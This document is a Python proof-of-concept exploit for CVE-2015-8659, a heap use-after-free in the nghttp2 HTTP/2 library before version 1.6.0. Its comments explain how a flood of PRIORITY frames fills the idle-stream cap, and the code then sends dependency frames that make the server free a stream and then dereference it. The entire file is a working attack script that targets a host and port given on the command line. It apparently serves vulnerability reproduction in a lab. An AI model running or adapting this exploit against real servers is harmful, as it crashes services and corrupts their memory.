#!/usr/bin/env python3
"""
PoC for CVE-2015-8659 - nghttp2 < 1.6.0 heap-use-after-free in idle/closed
stream dependency handling (CWE-416 / CWE-119, CVSS 10.0). h2c cleartext.

Mechanism (lib/nghttp2_session.c, vulnerable v1.5.0)
---------------------------------------------------
A server receiving a PRIORITY frame whose stream-id OR whose dependency
(pri_spec->stream_id) points at an *idle* stream creates an NGHTTP2_STREAM_IDLE
anchor node via nghttp2_session_open_stream(). That immediately calls
nghttp2_session_keep_idle_stream() -> nghttp2_session_adjust_idle_stream().
With default settings the idle-stream cap is nghttp2_max(2, ...) = 2, so the
moment a 3rd idle stream exists the OLDEST idle stream (idle_stream_head) is
handed to nghttp2_session_destroy_stream() and freed -- while it is still
referenced as the dependency parent the just-created stream is being inserted
under (nghttp2_stream_dep_insert). The dependency-tree pointer ops then touch
freed memory -> heap-use-after-free.

To trigger we open a *chain* of idle anchor streams via PRIORITY frames so that
each newly created idle stream depends on the previous idle stream, and we cross
the cap of 2 idle streams, forcing the head (a stream still wired into the
dependency tree) to be freed and then dereferenced.

We implement raw HTTP/2 framing; no h2 library required.

Usage: poc_cve_2015_8659.py [host] [port]
"""
import socket
import struct
import sys
import time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FRAME_SETTINGS = 0x4
FRAME_PRIORITY = 0x2
FLAG_ACK = 0x1


def frame(ftype, flags, stream_id, payload=b""):
    # length(3) + type(1) + flags(1) + R(1bit)+streamid(31bit)
    return (
        struct.pack(">I", len(payload))[1:]
        + struct.pack(">BB", ftype, flags)
        + struct.pack(">I", stream_id & 0x7FFFFFFF)
        + payload
    )


def priority_frame(stream_id, dep_stream_id, weight=16, exclusive=False):
    # PRIORITY payload: 1-bit E + 31-bit stream dependency + 8-bit weight.
    # weight on the wire is (actual_weight - 1).
    dep = dep_stream_id & 0x7FFFFFFF
    if exclusive:
        dep |= 0x80000000
    return frame(FRAME_PRIORITY, 0x0, stream_id, struct.pack(">IB", dep, weight - 1))


def main():
    print(f"[*] Connecting to {host}:{port}")
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(PREFACE)
    # Our SETTINGS (empty) + ACK to the server's SETTINGS.
    s.sendall(frame(FRAME_SETTINGS, 0x0, 0))
    s.sendall(frame(FRAME_SETTINGS, FLAG_ACK, 0))

    # Exact UAF trigger, reverse-engineered from the v1.6.0 fix (commit 92a56d0).
    #
    # In vulnerable v1.5.0 nghttp2_session_open_stream() runs, in this order:
    #   1. resolve `dep_stream` (the dependency parent -- may be an idle anchor)
    #   2. create the new idle anchor + keep_idle_stream() -> adjust_idle_stream()
    #      IMMEDIATELY, which (cap = nghttp2_max(2,..) = 2) frees idle_stream_head
    #      the instant a 3rd idle stream exists
    #   3. nghttp2_stream_dep_insert(dep_stream, stream)
    # If the head freed in (2) IS the `dep_stream` resolved in (1), step (3)
    # dereferences freed memory -> heap-use-after-free. The fix DEFERS
    # adjust_idle_stream to after the frame is fully processed.
    #
    # The idle-stream cap is nghttp2_max(2, min(max_concurrent_streams,
    # pending_local_max_concurrent_stream)). nghttpd advertises
    # SETTINGS_MAX_CONCURRENT_STREAMS = 100, so the effective cap is ~100 idle
    # streams, NOT 2. adjust_idle_stream() always evicts idle_stream_head (the
    # OLDEST idle stream) once the count exceeds the cap.
    #
    # Strategy: keep stream id 1 as the perpetual head by creating it FIRST, then
    # flood with enough fresh idle anchors to push the count just over the cap so
    # that the next eviction targets the head (stream 1). At that exact moment we
    # open one more idle anchor whose DEPENDENCY is stream 1 (the head): inside
    # the same open_stream() call, dep_stream is resolved to the live idle node 1,
    # keep_idle_stream()->adjust_idle_stream() then frees head 1, and the trailing
    # nghttp2_stream_dep_add(dep_stream=1[freed], new) dereferences freed memory
    # -> heap-use-after-free.

    CAP = 100  # nghttpd SETTINGS_MAX_CONCURRENT_STREAMS

    # Stream id 1 is created FIRST and never re-touched, so it stays
    # idle_stream_head forever. Fill to exactly CAP idle streams (1 + (CAP-1)
    # others). num_idle_streams == CAP, head == stream 1, all alive.
    HEAD = 1
    s.sendall(priority_frame(HEAD, 0, weight=16))
    sid = 3
    for _ in range(CAP - 1):
        s.sendall(priority_frame(sid, 0, weight=16))
        sid += 2

    # KILL FRAME: open a brand-new idle anchor `kill` whose DEPENDENCY is HEAD
    # (stream 1, the live head). Inside the single open_stream() call:
    #   dep_stream = get_stream_raw(1)            -> live idle node 1
    #   keep_idle_stream(kill) -> adjust_idle_stream(): num_idle_streams becomes
    #     CAP+1 > CAP, so idle_stream_head (== node 1 == dep_stream) is freed
    #   nghttp2_stream_dep_add(dep_stream=node1[FREED], kill)  -> UAF
    kill = sid
    sid += 2
    s.sendall(priority_frame(kill, HEAD, weight=16))

    # Fire several more kill frames (still depending on the now-dangling head 1)
    # in case the first write was coalesced; each fresh idle anchor re-triggers
    # an eviction of the head while referencing it.
    for _ in range(64):
        s.sendall(priority_frame(sid, HEAD, weight=255, exclusive=True))
        sid += 2

    try:
        s.shutdown(socket.SHUT_WR)
    except OSError:
        pass

    time.sleep(0.5)
    try:
        data = s.recv(256)
        print(f"[*] Server response: {data!r}")
    except OSError as e:
        print(f"[*] Connection closed/reset (expected on crash): {e}")
    s.close()
    print("[*] Done. Check `docker logs` for the ASan heap-use-after-free trace.")


if __name__ == "__main__":
    main()
